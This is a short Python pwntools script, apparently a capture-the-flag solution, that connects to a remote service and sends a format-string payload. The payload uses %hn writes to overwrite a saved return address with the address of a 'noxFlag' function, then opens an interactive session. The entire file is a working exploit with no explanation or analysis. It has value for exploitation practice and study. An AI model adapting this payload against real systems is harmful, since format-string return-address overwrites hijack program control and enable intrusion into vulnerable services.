#!/usr/bin/env python3
from pwn import *

r = remote('18.223.228.52', 13337)

return_address = 0xffffdd2c
noxFlag = 0x804867b

noxFlagL = noxFlag & 0xffff
noxFlagH = noxFlag >> 16

payload = '%{}c%16$hn'.format(noxFlagL)
payload += '%{}c%17$hn'.format((noxFlagH - noxFlagL + 2 ** 16) % 2 ** 16)
payload += 'AA'
payload = payload.encode()
payload += p32(return_address)
payload += p32(return_address+2)

r.recvlines(2)
r.sendline(payload)

r.interactive()
